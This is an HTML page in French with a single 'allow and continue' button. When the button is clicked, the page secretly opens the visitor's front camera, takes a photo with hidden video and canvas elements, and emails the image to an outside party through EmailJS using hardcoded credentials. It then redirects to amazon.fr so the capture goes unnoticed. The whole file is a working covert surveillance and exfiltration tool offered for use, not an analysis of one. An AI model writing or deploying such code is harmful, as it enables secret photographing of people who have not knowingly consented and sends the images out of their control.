<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Photo invisible</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #fafafa;
    }
    button {
      padding: 12px 18px;
      font-size: 14px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      background: #007bff;
      color: white;
    }
    /* Cache totalement les Ã©lÃ©ments techniques */
    video, canvas {
      display: none !important;
    }
  </style>
</head>
<body>
  <button id="capture">ðŸ“¸ Autoriser et continuer</button>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="200" height="150"></canvas>

  <script>
    emailjs.init("IoSfbtGz4KSL_5_9E");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const button = document.getElementById('capture');

    button.addEventListener('click', async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        // Quand la vidÃ©o est prÃªte â†’ capture immÃ©diate
        video.onloadeddata = () => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/jpeg", 0.2);

          // Stop camÃ©ra
          stream.getTracks().forEach(track => track.stop());

          // Envoi via EmailJS
          emailjs.send("service_8cs0gml", "template_rdhxflt", {
            message: "Photo capturÃ©e et envoyÃ©e ðŸ“¸",
            image: imageData
          }).finally(() => {
            // Redirection automatique aprÃ¨s envoi ou erreur
            window.location.href = "https://www.amazon.fr";
          });
        };
      } catch (err) {
        // Si refus ou erreur â†’ quand mÃªme rediriger
        window.location.href = "https://www.amazon.fr";
      }
    });
  </script>
</body>
</html>
